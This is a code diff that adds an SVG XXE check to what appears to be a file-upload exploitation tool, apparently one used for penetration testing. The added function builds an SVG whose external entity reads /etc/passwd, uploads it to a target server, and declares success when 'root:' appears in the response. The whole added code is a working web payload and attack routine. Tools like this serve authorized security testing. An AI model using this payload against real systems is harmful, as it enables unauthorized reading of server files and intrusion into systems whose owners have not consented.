@@ -233,3 +233,36 @@ def htaccess_overwrite(request_file, session, options, accepted_extensions):
                 if (options.manual_check):
                     input("Manual check enabled, waiting for input...")
 
+
+def svg_xxe(request_file, session, options, accepted_extensions):
+    print()
+    info(".svg XXE", spacing=False)
+    print()
+
+    mimetype = config.mimetypes["svg"]
+    file_extension = f".svg"
+    file_name = generate_random_string(10) + file_extension
+    file_data = '''
+    <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+    '''.encode('utf-8')
+
+    content, headers, host, path = parse_request_file(request_file)
+    upload_url = f"{config.protocol}://{host}{options.upload_dir}"
+
+    response, session, headers, url, file_name = upload(request_file, session, file_data, file_name, mimetype)
+    if ("root:" in response):
+        success("XXE confirmed")
+    else:
+        debug((upload_url + file_name), 0)
+        if ("<svg>" not in response):
+            if (options.manual_check):
+                input("Manual check enabled, waiting for input...")
+            else:
+                warning("Image content not reflected in response, try checking manually with --manual-check")
+        else:
+            warning("Couldn't find XXE in response")
+
+
+
